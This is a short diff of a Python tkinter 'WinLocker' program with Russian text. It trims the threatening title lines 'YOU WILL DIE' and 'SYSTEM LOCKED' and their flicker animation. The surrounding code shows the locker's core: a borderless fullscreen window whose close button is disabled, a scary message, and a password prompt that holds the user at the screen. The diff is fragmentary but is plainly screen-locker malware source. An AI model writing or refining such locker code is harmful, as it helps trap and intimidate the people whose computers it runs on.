@@ -61,13 +61,9 @@ class WinLocker:
         self.win.overrideredirect(True)
         self.win.protocol("WM_DELETE_WINDOW", lambda: None)
         
-        # Основной Canvas для графики (текст слева)
+        # Основной Canvas
         self.canvas = tk.Canvas(self.win, bg='black', highlightthickness=0)
         self.canvas.pack(fill='both', expand=True)
-        
-        # Центральные надписи вверху
-        self.canvas.create_text(400, 80, text="ВЫ УМРЁТЕ", fill='white', font=('Courier', 60, 'bold'), tags="title")
-        self.canvas.create_text(400, 160, text="СИСТЕМА ЗАБЛОКИРОВАНА", fill='white', font=('Courier', 36))
         
         # Страшный текст в левом нижнем углу
         scary_text = (
@@ -87,7 +83,7 @@ class WinLocker:
         )
         self.canvas.create_text(50, 550, text=scary_text, fill='white', font=('Courier', 14), anchor='sw')
         
-        # Поле ввода по центру (чуть ниже заголовков)
+        # Поле ввода по центру
         self.canvas.create_text(400, 250, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28))
         self.entry = tk.Entry(self.win, show="*", font=('Courier', 28), bg='black', fg='white', insertbackground='white')
         self.canvas.create_window(400, 310, window=self.entry)
@@ -107,10 +103,7 @@ class WinLocker:
             self.entry.delete(0, tk.END)
     
     def animate(self):
-        if random.random() < 0.1:
-            self.canvas.itemconfig("title", fill='gray')
-        else:
-            self.canvas.itemconfig("title", fill='white')
+        # Просто мерцание курсора, без лишних надписей
         self.win.after(50, self.animate)
 
 # === ЗАПУСК ===
